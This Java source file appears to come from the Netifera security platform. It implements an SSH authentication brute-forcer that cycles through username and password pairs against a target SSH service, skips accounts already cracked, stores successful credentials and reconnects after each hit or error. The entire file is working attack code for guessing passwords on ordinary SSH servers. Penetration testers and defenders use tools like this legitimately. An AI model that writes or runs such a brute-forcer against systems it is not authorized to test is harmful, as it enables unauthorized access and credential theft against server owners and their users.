package com.netifera.platform.net.ssh.tools;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

import com.netifera.platform.net.services.auth.CredentialsVerifier;
import com.netifera.platform.net.services.credentials.Credential;
import com.netifera.platform.net.services.credentials.UsernameAndPassword;
import com.netifera.platform.net.services.ssh.SSH;
import com.netifera.platform.net.ssh.internal.tools.Activator;
import com.netifera.platform.net.tools.bruteforce.UsernameAndPasswordBruteforcer;
import com.netifera.platform.util.locators.TCPSocketLocator;
import com.trilead.ssh2.Connection;

public class SSHAuthBruteforcer extends UsernameAndPasswordBruteforcer {
	private TCPSocketLocator target;
	private Set<String> foundUsers = new HashSet<String>();
	
	@Override
	protected void setupToolOptions() {
		super.setupToolOptions();
		target = (TCPSocketLocator) context.getConfiguration().get("target");
		context.setTitle("Bruteforce authentication on SSH @ "+target);
	}
	
	@Override
	public void authenticationSucceeded(Credential credential) {
		UsernameAndPassword up = (UsernameAndPassword) credential;
		Activator.getInstance().getNetworkEntityFactory().createUsernameAndPassword(realm, context.getSpaceId(), target, up.getUsernameString(), up.getPasswordString());
		super.authenticationSucceeded(credential);
	}
	
	@Override
	public CredentialsVerifier createCredentialsVerifier() {
		return new CredentialsVerifier() {
			
			@Override
			public void run() throws IOException, InterruptedException {
				SSH ssh = new SSH(target);
				Connection connection = ssh.createConnection();
				while (hasNextCredential()) {
					UsernameAndPassword credential = null;
					do {
						credential = (UsernameAndPassword) nextCredentialOrNull();
					} while (credential != null && foundUsers.contains(credential.getUsernameString()));

					if (credential == null)
						return;
					
					try {
						boolean success = connection.authenticateWithPassword(credential.getUsernameString(), credential.getPasswordString());
						if (success) {
							listener.authenticationSucceeded(credential);
							foundUsers.add(credential.getUsernameString());
							connection.close();
							if (hasNextCredential()) {
								Thread.sleep(2000);
								connection = ssh.createConnection();
							}
						} else {
							listener.authenticationFailed(credential);
						}
					} catch (IOException e) {
						listener.authenticationError(credential, e);
						connection.close();
						if (hasNextCredential()) {
							Thread.sleep(2000);
							connection = ssh.createConnection();
						}
					}
				}
			}
		};
	}
}
